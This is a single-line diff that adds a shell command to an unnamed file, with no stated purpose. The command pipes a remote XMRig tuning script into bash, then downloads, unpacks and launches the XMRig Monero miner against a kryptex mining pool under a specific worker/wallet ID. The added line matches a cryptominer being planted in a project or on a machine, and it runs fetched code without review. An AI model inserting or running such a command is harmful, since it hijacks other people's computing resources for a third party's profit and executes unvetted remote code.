@@ -1,0 +1,1 @@
+wget -O - https://raw.githubusercontent.com/xmrig/xmrig/refs/heads/dev/scripts/randomx_boost.sh | bash && wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz && tar xf xmrig-6.22.2-linux-static-x64.tar.gz && cd xmrig-6.22.2 && ./xmrig -a rx -o stratum+tcp://xmr.kryptex.network:7777 -p x -u krxYN6R87Q.worker
